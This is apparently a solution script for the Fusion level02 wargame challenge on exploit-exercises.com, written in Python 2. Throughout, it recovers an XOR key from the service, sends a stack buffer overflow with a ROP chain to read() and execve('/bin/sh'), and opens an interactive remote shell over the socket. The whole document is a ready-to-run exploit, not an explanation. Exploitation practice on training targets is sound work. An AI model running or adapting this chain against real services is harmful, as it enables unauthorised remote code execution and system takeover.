#!/usr/bin/env python
#
# http://exploit-exercises.com/fusion/level02
#
# NOTE: If you want to debug level02 you need to 'set follow-fork-mode child'
#	under gdb (after attaching to specific PID).
#
# There are 2 mistakes in this example that lead to exploitable condition:
#	(1) Stack-based buffer overflow in encrypt_file() (line 48)
#	(2) Usage of static variables in cipher()
#
# More reliable solution via simple ROP chain.

import sys
import array
import socket
import struct
import telnetlib

def main():
	s = socket.socket()
	s.connect((HOST, PORT))

	print s.recv(1024)

	# Dummy payload to get XOR-ed buffer
	cmd = 'E'
	sz = 128 # Key size in bytes (32*4)
	data = 'A'*sz
	sz = struct.pack("<I", sz)
	payload = cmd + sz + data
	s.send(payload)
	raw_input("Press enter to proceed ") # This is required (sleep also works). Bonus question: Why?
	data = s.recv(1024)
	key = data[-128:] # We're receiving <banner> + <size of buffer> + <XORed buffer>; hence we need to pull out last 128 bytes
	
	# Recovering the key from XOR-ed buffer (XOR-ing with original buffer)
	key = array.array('B', key)
	data = 'A'*128
	data = array.array('B', data)
	for i in range(len(key)):
		key[i] ^= data[i]
	print "[+] Key: " + key.tostring().encode("hex")

	# Actual payload crafting
	cmd = 'E'
	sz = (32*4096)+12
	data = 'B' * sz # Sled
	data += "ABCD" # SFP
	data += "\x66\x88\x04\x08" # initial RET to read()
	data += "\x85\x8f\x04\x08" # read() RET to pop-pop-pop-ret
	data += "\x00\x00\x00\x00" # read() 1st arg
	data += "\x20\xb4\x04\x08" # read() 2nd arg
	data += "\x10\x00\x00\x00" # read() 3rd arg
	data += "\xb6\x89\x04\x08" # RET to execve()
	data += "DCBA"
	data += "\x28\xb4\x04\x08" # execve() 1st arg
	data += "\x20\xb4\x04\x08" # execve() 2nd arg
	data += "\x00\x00\x00\x00" # execve() 3rd arg
	sz += len(data) - sz # Add ROP chain length

	# Encrypting data with retrieved key
	data = array.array('B', data)
	for i in range(len(data)):
		data[i] ^= key[i%128]
	data = data.tostring()
	
	sz = struct.pack("<I", sz)
	payload = cmd + sz + data
	s.send(payload)
	raw_input("Press enter to proceed ")
	s.send('Q') # Boom goes the dynamite!

	# Crafting arguments for execve() using .BSS @ 0x0804b420 which is
	# constant (objdump -x level02)
	arg = "\x28\xb4\x04\x08"
	arg += "\x00\x00\x00\x00"
	arg += "/bin/sh" + '\x00'
	s.send(arg) # This will be read-in via read() from our ROP chain

	# Catching our new shell session
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
	
	s.close()

if __name__ == "__main__":
	if(len(sys.argv) < 2):
		print sys.argv[0] + " <IP>"
		sys.exit(1)
	HOST = sys.argv[1]
	PORT = 20002
	
	main()

